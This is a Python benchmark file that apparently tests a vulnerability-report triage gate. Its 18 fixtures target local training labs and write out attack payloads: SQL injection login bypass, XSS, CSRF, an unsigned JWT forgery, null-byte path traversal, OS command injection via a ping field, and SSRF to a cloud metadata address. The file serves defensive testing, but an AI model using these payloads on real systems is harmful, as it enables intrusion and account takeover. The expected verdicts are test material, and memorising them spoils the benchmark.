"""
18-Exercise Ground Truth Benchmark Suite for Triage Gate.
Evaluates Tier 1 (T1.1 - T1.6), Tier 2 (T2.1 - T2.6), and Tier 3 (T3.1 - T3.6)
against engine/triage_evaluator.py.
"""

import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from engine.triage_evaluator import TriageEvaluator, CandidateFinding

evaluator = TriageEvaluator()

EXERCISES = [
    # --- TIER 1: Web Fundamentals & Common Flaws ---
    {
        "id": "T1.1",
        "name": "Juice Shop SQLi Login Bypass",
        "finding": CandidateFinding(
            title="SQL Injection Authentication Bypass via Email Parameter",
            program="local_lab",
            target_host="localhost",
            request_method="POST",
            request_url="http://localhost:3000/rest/user/login",
            request_headers={"Content-Type": "application/json"},
            request_body='{"email": "\' OR 1=1--", "password": "x"}',
            response_status=200,
            response_headers={"Content-Type": "application/json"},
            response_body='{"authentication":{"token":"jwt.token.here","user":{"id":1}}}',
            second_account_tested=True,
            attacker_controlled_proof="Logged in as admin (ID 1) without valid credentials",
            is_lab=True
        ),
        "expected": "VALID-PAYABLE"
    },
    {
        "id": "T1.2",
        "name": "Juice Shop Reflected XSS",
        "finding": CandidateFinding(
            title="Reflected Cross-Site Scripting via Product Search Query",
            program="local_lab",
            target_host="localhost",
            request_method="GET",
            request_url="http://localhost:3000/rest/products/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
            response_status=200,
            response_headers={"Content-Type": "application/json"},
            response_body='{"data":[{"name":"<script>alert(1)</script>"}]}',
            attacker_controlled_proof="Injected payload reflected unencoded in HTTP response",
            is_lab=True
        ),
        "expected": "VALID-PAYABLE"
    },
    {
        "id": "T1.3",
        "name": "Juice Shop Stored XSS in Feedback",
        "finding": CandidateFinding(
            title="Stored Cross-Site Scripting in Customer Feedback",
            program="local_lab",
            target_host="localhost",
            request_method="POST",
            request_url="http://localhost:3000/api/Feedbacks/",
            request_headers={"Content-Type": "application/json"},
            request_body='{"comment": "<iframe src=javascript:alert(1)>"}',
            response_status=201,
            response_headers={"Content-Type": "application/json"},
            response_body='{"data":{"id":42,"comment":"<iframe src=javascript:alert(1)>"}}',
            second_account_tested=True,
            attacker_controlled_proof="Payload persistently stored in database and served to other users",
            is_lab=True
        ),
        "expected": "VALID-PAYABLE"
    },
    {
        "id": "T1.4",
        "name": "DVWA SQLi at Security Level 'Impossible'",
        "finding": CandidateFinding(
            title="SQL Injection Probe on Parameterized Search (Security Impossible)",
            program="local_lab",
            target_host="localhost",
            request_method="GET",
            request_url="http://localhost:8082/vulnerabilities/sqli/?id=1'+OR+1=1#&Submit=Submit",
            request_headers={"Cookie": "security=impossible; PHPSESSID=test"},
            response_status=200,
            response_headers={"Content-Type": "text/html"},
            response_body="<html><body>PDO Prepared statement used. ID: 1. No syntax error or data leak.</body></html>",
            second_account_tested=False,
            attacker_controlled_proof="",  # Empty proof because PDO prepared statements blocked exploit!
            is_lab=True
        ),
        "expected": "KILL"
    },
    {
        "id": "T1.5",
        "name": "Juice Shop Account Takeover via Security Question",
        "finding": CandidateFinding(
            title="Authentication Bypass & Account Takeover via Predictable Security Question",
            program="local_lab",
            target_host="localhost",
            request_method="POST",
            request_url="http://localhost:3000/rest/user/reset-password",
            request_headers={"Content-Type": "application/json"},
            request_body='{"email": "bender@juice-sh.op", "answer": "Stop\'n\'Drop", "new": "pwn123", "repeat": "pwn123"}',
            response_status=200,
            response_headers={"Content-Type": "application/json"},
            response_body='{"user":{"id":3,"email":"bender@juice-sh.op"}}',
            second_account_tested=True,
            attacker_controlled_proof="Victim password reset successfully without existing credentials",
            is_lab=True
        ),
        "expected": "VALID-PAYABLE"
    },
    {
        "id": "T1.6",
        "name": "DVWA Cross-Site Request Forgery (CSRF Password Change)",
        "finding": CandidateFinding(
            title="Cross-Site Request Forgery (CSRF) on Password Change Endpoint",
            program="local_lab",
            target_host="localhost",
            request_method="GET",
            request_url="http://localhost:8082/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change",
            request_headers={"Cookie": "security=low; PHPSESSID=victim_session"},
            response_status=200,
            response_headers={"Content-Type": "text/html"},
            response_body="<pre>Password Changed.</pre>",
            second_account_tested=True,
            attacker_controlled_proof="Password changed via unauthenticated GET request with zero CSRF token validation",
            is_lab=True
        ),
        "expected": "VALID-PAYABLE"
    },

    # --- TIER 2: API & Logic Flaws ---
    {
        "id": "T2.1",
        "name": "Juice Shop IDOR / BOLA on Basket",
        "finding": CandidateFinding(
            title="Insecure Direct Object Reference (IDOR) on Basket Retrieval",
            program="local_lab",
            target_host="localhost",
            request_method="GET",
            request_url="http://localhost:3000/rest/basket/2",
            request_headers={"Authorization": "Bearer admin_token"},
            response_status=200,
            response_headers={"Content-Type": "application/json"},
            response_body='{"data":{"id":2,"UserId":2,"Products":[{"name":"Apple Juice"}]}}',
            second_account_tested=True,
            attacker_controlled_proof="Session 1 successfully extracted private basket belonging to User 2",
            is_lab=True
        ),
        "expected": "VALID-PAYABLE"
    },
    {
        "id": "T2.2",
        "name": "WebGoat Mass Assignment / Parameter Tampering",
        "finding": CandidateFinding(
            title="Mass Assignment Privilege Escalation via Role Parameter Mutation",
            program="local_lab",
            target_host="localhost",
            request_method="POST",
            request_url="http://localhost:8081/WebGoat/role-mutation",
            request_headers={"Content-Type": "application/json"},
            request_body='{"username": "victim_user", "role": "admin"}',
            response_status=200,
            response_headers={"Content-Type": "application/json"},
            response_body='{"status":"success","role":"admin"}',
            second_account_tested=True,
            attacker_controlled_proof="Standard user account upgraded to administrative privileges",
            is_lab=True
        ),
        "expected": "VALID-PAYABLE"
    },
    {
        "id": "T2.3",
        "name": "Juice Shop BFLA / User Database Leak",
        "finding": CandidateFinding(
            title="Broken Function Level Auth (BFLA) Exposing User Database and Password Hashes",
            program="local_lab",
            target_host="localhost",
            request_method="GET",
            request_url="http://localhost:3000/api/Users/",
            request_headers={"Authorization": "Bearer regular_token"},
            response_status=200,
            response_headers={"Content-Type": "application/json"},
            response_body='{"data":[{"id":1,"email":"admin@juice-sh.op","password":"hash"}]}',
            second_account_tested=True,
            attacker_controlled_proof="Unprivileged user queries administrative endpoint dumping tenant records",
            is_lab=True
        ),
        "expected": "VALID-PAYABLE"
    },
    {
        "id": "T2.4",
        "name": "crAPI BOLA Without Second Account Proof (Stage 0 Failure)",
        "finding": CandidateFinding(
            title="Insecure Direct Object Reference (BOLA) on Vehicle Location",
            program="local_lab",
            target_host="localhost",
            request_method="GET",
            request_url="http://localhost:8888/identity/api/v2/vehicle/123/location",
            response_status=200,
            response_headers={"Content-Type": "application/json"},
            response_body='{"location": {"latitude": 37.7749, "longitude": -122.4194}}',
            second_account_tested=False,  # FAILS STAGE 0(c) REQUIREMENT
            attacker_controlled_proof="",
            is_lab=True
        ),
        "expected": "LEAD"  # Must NOT pass to payable without multi-account proof
    },
    {
        "id": "T2.5",
        "name": "Missing Rate Limit on Login with No Demonstrated Abuse",
        "finding": CandidateFinding(
            title="Missing Rate Limiting on Login Endpoint",
            program="local_lab",
            target_host="localhost",
            request_method="POST",
            request_url="http://localhost:3000/rest/user/login",
            request_headers={"Content-Type": "application/json"},
            request_body='{"email": "test@test.com", "password": "wrong"}',
            response_status=401,
            response_headers={"Content-Type": "application/json"},
            response_body='{"error": "Invalid email or password."}',
            second_account_tested=False,
            attacker_controlled_proof="",
            is_lab=True
        ),
        "expected": "VALID-INFORMATIONAL"
    },
    {
        "id": "T2.6",
        "name": "Juice Shop Auth / JWT None Algorithm Signature Bypass",
        "finding": CandidateFinding(
            title="Authentication Bypass via Unsigned JWT None-Algorithm Header",
            program="local_lab",
            target_host="localhost",
            request_method="GET",
            request_url="http://localhost:3000/rest/user/change-password?new=pwn123",
            request_headers={"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIn0."},
            response_status=200,
            response_headers={"Content-Type": "application/json"},
            response_body='{"authentication": {"user": {"email": "admin@juice-sh.op"}}}',
            second_account_tested=True,
            attacker_controlled_proof="Unsigned forged token accepted by authentication middleware",
            is_lab=True
        ),
        "expected": "VALID-PAYABLE"
    },

    # --- TIER 3: Advanced, Boundary & Destructive Probes ---
    {
        "id": "T3.1",
        "name": "Juice Shop SSTI Remote Code Execution",
        "finding": CandidateFinding(
            title="Server-Side Template Injection (SSTI) Remote Code Execution in User Profile",
            program="local_lab",
            target_host="localhost",
            request_method="GET",
            request_url="http://localhost:3000/profile",
            request_headers={"Cookie": "token=admin_token"},
            response_status=200,
            response_headers={"Content-Type": "text/html"},
            response_body="<html><body>root whoami executed</body></html>",
            second_account_tested=False,
            attacker_controlled_proof="Arbitrary JavaScript code evaluated server-side via #{...} username template",
            is_lab=True
        ),
        "expected": "VALID-PAYABLE"
    },
    {
        "id": "T3.2",
        "name": "Juice Shop Path Traversal via Null Byte Poisoning",
        "finding": CandidateFinding(
            title="Arbitrary File Read via Poisoned Null Byte Path Traversal",
            program="local_lab",
            target_host="localhost",
            request_method="GET",
            request_url="http://localhost:3000/ftp/package.json.bak%2500.md",
            response_status=200,
            response_headers={"Content-Type": "application/octet-stream"},
            response_body='{"name": "juice-shop", "version": "6.2.0-SNAPSHOT"}',
            second_account_tested=False,
            attacker_controlled_proof="Source file package.json.bak extracted bypassing .md extension allowlist",
            is_lab=True
        ),
        "expected": "VALID-PAYABLE"
    },
    {
        "id": "T3.3",
        "name": "SSRF Target Deny List Violation (Metadata 169.254.169.254)",
        "finding": CandidateFinding(
            title="Server-Side Request Forgery Targeting AWS Cloud Metadata",
            program="local_lab",
            target_host="169.254.169.254",  # DIRECT PERMANENT DENY VIOLATION
            request_method="GET",
            request_url="http://169.254.169.254/latest/meta-data/",
            response_status=200,
            is_lab=True
        ),
        "expected": "KILL"  # Must be blocked by Permanent Deny List in Rule 08
    },
    {
        "id": "T3.4",
        "name": "BFLA Destructive Data Deletion (Blast Radius Constraint)",
        "finding": CandidateFinding(
            title="Broken Function Level Auth (BFLA) Mutation Deleting Secondary Tenant Records",
            program="local_lab",
            target_host="localhost",
            request_method="DELETE",
            request_url="http://localhost:3000/api/Users/2",
            request_headers={"Authorization": "Bearer attacker_token"},
            response_status=200,
            response_headers={"Content-Type": "application/json"},
            response_body='{"status": "deleted"}',
            second_account_tested=True,
            attacker_controlled_proof="Secondary user account deleted by unprivileged attacker",
            is_lab=True
        ),
        "expected": "VALID-PAYABLE"
    },
    {
        "id": "T3.5",
        "name": "DVWA Blind / OS Command Injection",
        "finding": CandidateFinding(
            title="OS Command Injection via Ping Parameter",
            program="local_lab",
            target_host="localhost",
            request_method="POST",
            request_url="http://localhost:8082/vulnerabilities/exec/",
            request_headers={"Content-Type": "application/x-www-form-urlencoded", "Cookie": "security=low; PHPSESSID=session"},
            request_body="ip=127.0.0.1%3B+whoami&Submit=Submit",
            response_status=200,
            response_headers={"Content-Type": "text/html"},
            response_body="<pre>PING 127.0.0.1\nwww-data\n</pre>",
            second_account_tested=False,
            attacker_controlled_proof="Command 'whoami' returned system user www-data in response body",
            is_lab=True
        ),
        "expected": "VALID-PAYABLE"
    },
    {
        "id": "T3.6",
        "name": "Missing Security Headers (CSP / HSTS) on Static Resource",
        "finding": CandidateFinding(
            title="Missing Content-Security-Policy and HSTS Headers",
            program="local_lab",
            target_host="localhost",
            request_method="GET",
            request_url="http://localhost:3000/assets/public/favicon_js.ico",
            response_status=200,
            response_headers={"Content-Type": "image/x-icon"},
            response_body="BINARY_FAVICON_DATA",
            second_account_tested=False,
            attacker_controlled_proof="",
            is_lab=True
        ),
        "expected": "VALID-INFORMATIONAL"
    }
]


def run_benchmark():
    passed = 0
    total = len(EXERCISES)
    results = []

    for ex in EXERCISES:
        res = evaluator.evaluate(ex["finding"])
        verdict = res["verdict"]
        is_pass = (verdict == ex["expected"])
        if is_pass:
            passed += 1

        diff = "None (Match)" if is_pass else f"Expected {ex['expected']} but got {verdict} (Gap: {res.get('blocking_gap', 'N/A')})"
        results.append({
            "id": ex["id"],
            "name": ex["name"],
            "expected": ex["expected"],
            "verdict": verdict,
            "pass": is_pass,
            "diff": diff
        })

    return passed, total, results


if __name__ == "__main__":
    passed, total, results = run_benchmark()
    print("=" * 90)
    print(f"TRIAGE GATE 18-EXERCISE BENCHMARK RESULTS: {passed}/{total} PASSED ({passed/total*100:.1f}%)")
    print("=" * 90)
    print(f"{'Exercise':<6} | {'Expected Verdict':<20} | {'Gate Verdict':<20} | {'Status':<6} | {'Reason / Notes'}")
    print("-" * 90)
    for r in results:
        status_str = "PASS" if r["pass"] else "FAIL"
        print(f"{r['id']:<6} | {r['expected']:<20} | {r['verdict']:<20} | {status_str:<6} | {r['diff']}")
    print("=" * 90)
